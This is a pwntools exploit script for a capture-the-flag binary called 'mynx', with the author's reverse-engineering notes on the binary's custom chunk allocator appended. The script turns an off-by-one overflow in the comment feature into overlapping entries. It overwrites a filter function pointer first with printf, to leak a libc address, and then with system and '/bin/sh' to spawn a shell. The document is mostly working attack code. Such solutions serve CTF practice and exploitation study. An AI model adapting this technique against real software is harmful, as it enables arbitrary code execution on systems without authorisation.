#!/usr/bin/env python3

from pwn import *

exe = ELF("./mynx")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")

context.binary = exe


def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("addr", 1337)


def main():
    r = conn()

    def add_ascii(filter, data):
    	r.recvuntil("> ")
    	r.sendline("1")
    	r.recvuntil("> ")
    	r.sendline(str(filter))
    	r.recvuntil("enter your ascii art >>>")
    	r.send(data)

    def browse_ascii():
    	r.recvuntil("> ")
    	r.sendline("2")

    def add_comment(id, comment):
    	r.recvuntil("> ")
    	r.sendline("3") # select ascii art
    	r.recvuntil("enter ascii art id")
    	r.recvuntil("> ")
    	r.sendline(str(id))
    	r.recvuntil("> ")
    	r.sendline("1")
    	r.recvuntil("enter your comment")
    	r.send(comment)
    	r.sendline("0") # back to main menu

    def remove_comments(id):
    	r.recvuntil("> ")
    	r.sendline("3")
    	r.recvuntil("enter ascii art id")
    	r.recvuntil("> ")
    	r.sendline(str(id))
    	r.recvuntil("> ")
    	r.sendline("2")
    	r.sendline("0")

    def apply_filter(id):
    	r.recvuntil("> ")
    	r.sendline("3")
    	r.recvuntil("enter ascii art id")
    	r.recvuntil("> ")
    	r.sendline(str(id))
    	r.recvuntil("> ")
    	r.sendline("3")
    	r.sendline("0")


    # set up the table
    add_ascii(0, "A"*0xf7)
    add_comment(1, "B"*0xfb)
    add_ascii(0, "C"*0xf7)
    add_comment(1, "B"*0xfb)
    add_comment(2, p32(exe.symbols['printf']) +  "%8$x")

    # switch entry 2 with its comment -> overwrite the function ptr -> call printf to read the stack
    remove_comments(1)
    add_comment(1, "B"*0xfb + "\x37")
    add_comment(1, "B"*0xfb + "\x49")

    # leak libc address
    apply_filter(2)
    leak = int(r.recvn(8), 16)
    libc.address = leak - 0x1b23dc
    log.info("libc base address: {}".format(hex(libc.address)))


    # switch again, and this time overwrite the function ptr with system and +9 with "/bin/sh\x00"
    remove_comments(2)
    add_comment(2, p32(libc.symbols['system']) + "/bin/sh\x00")
    remove_comments(1)
    add_comment(1, "B"*0xfb + "\x49")
    add_comment(1, "B"*0xfb + "\x37")
    apply_filter(2)

    #gdb.attach(r)
    r.interactive()


if __name__ == "__main__":
    main()
'''
CHUNKS_0804a900 + i*8  - chunks of 0x1000
COUNTERS_0804a904 + i*8 - nr of minichunks being in use
PTR_FUN_0804a890 - list of ptrs of filter functions
s_INVERT_0804a880 - strings of filters
CNT_0804a940 - entry counter

- only 8 chunks
- each chunk is divided in 15 different mini-chunks - +0, +256, +512 etc

1) add ascii art
	- select filter - invert (0) ; LOLOLOL (1); case inversion (2)
	- calls select_chunk
			- check if chunk[i] is zero.
				- if yes, malloc(0x1000) and zeroes it out
				- if counters[i] < 0x10, returns chunk[i]

	- calls select_minichunk(chunk)
			- search through mini chunks of the respective chunk
			- *mini_chunk & 1 == 0, set it to 1 and return this mini_chunk // can select comment minichunk?

	- [0] represents the in-use field which becomes 0x49
	- [1] represents CNT_0804a940 (entry nr) before it is incremented
	- [5] represent ptr to filterFun
	- [9] read our input 0xf7
	


2) browse
	- searches through all chunks and minichunks
	- if *minichunk = 0x49
		- printf entry nr (+1)
		- puts input (+9) INFO LEAK???
		- calls filter_string




3) select ascii art
	- input ascii art id
	- call find_minichunk
			- searches through all minichunks
			- if (*miniChunk & 0x48) != 0 AND (*(int *)(miniChunk + 1) == id), returns minichunk+1 (ommiting the first byte??)

	- prints +9 our input
	- calls print_comment(id)
			- searches through all minichunks
			- if (*miniChunk == 0x37) AND (*(int *)(miniChunk + 1) == id), prints minichunk+5


	- print another menu and asks for our input

		1. Add comment
			- calls select_chunk and select_minichunk
			- [0] represents the in-use field which becomes 0x37 / 0x36
			- [1] represents CNT_0804a940 (entry nr) before it is incremented
			- [5] read our input 0xfc - OFF BY ONE OVERFLOW!!!!!!!!!!!!!!!!!!!

		2. Remove all comments - from an ascii art

			- searches through all minichunks
			- if (*miniChunk == 0x37) AND (*(int *)(miniChunk + 1) == id) - calls unset_inusebyte_decrement_cnt(chunk of minichunk)
				unset_inusebyte_decrement_cnt
					- chunk[1]--;
					- minichunk's first byte is set to 0

			- calls smallWTF
					- searches through every chunk. In every interation, search for all the chunk after that chunk
					- if chunk[i] and chunk[j] are allocated and the sum of their COUNTERS is < 0x11
						
						- calls bigWTF(i, j)
							- iterates thorugh all chunk[i]'s minichunks.
								- if free (& 1 == 0)
									- searches through all chunk[j]'s minichunks. 
										if allocated (& 1 != 0)  - memcpy(minichunk1 + 1,__src,0x100); // avoids the first byte??? doesn't check if it copies comment or ascii art ; copies the entry nr
																 - *minichunk1 = *minichunk1 | 1;  // set inuse - but it can happen to comments AND ascii art ??????
																 - *__src = 0;
							- frees(chunk2)  // unsortedbin so libc address! 


			BASICALLY: smallWTF and bigWTF make some kind of consolidation! - imiplications that remove is not perfect because it doesn't check behind??
					   incorrect copy? things aren't aligned because of minichunk1+1???

		3. Apply filter
			- calls function at [5] with [9] as argument    <--- overwrite to control the instruction pointer


		0. Go back


Filter functions;

	Filter 0 (inverse):
		- bitwise nots every one of the 0xf7 characters

	Filter 1 (LOLOLOL):
		- LOLOLOLOL's our input

	Filter 2 (case inversion):
		- does what is says it does




can unset bit with onebyte overflow -> 2 ptrs pointing to the same minichunk -> overwrite ptr
I can already leak a little because puts and im writing next to the I byte thing
'''